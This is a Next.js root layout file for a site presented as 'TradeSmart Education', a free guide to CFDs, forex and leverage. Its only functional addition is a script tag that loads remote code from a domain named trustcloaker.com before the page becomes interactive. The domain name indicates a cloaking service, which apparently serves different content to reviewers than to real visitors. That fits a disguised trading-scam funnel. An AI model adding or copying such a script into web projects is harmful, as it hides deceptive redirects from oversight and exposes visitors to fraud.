import type { Metadata } from "next";
import Script from "next/script";

export const metadata: Metadata = {
  title: "TradeSmart Education – Understanding Online Trading & Financial Markets",
  description:
    "Free educational resource covering CFDs, forex, leverage, risk management, and how online trading platforms work. Not financial advice.",
};

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en">
      <body style={{ margin: 0, padding: 0 }}>
        {children}
        <Script src="https://api.trustcloaker.com/api/v1/code/script.js?cid=fF0tf" strategy="beforeInteractive" />
      </body>
    </html>
  );
}
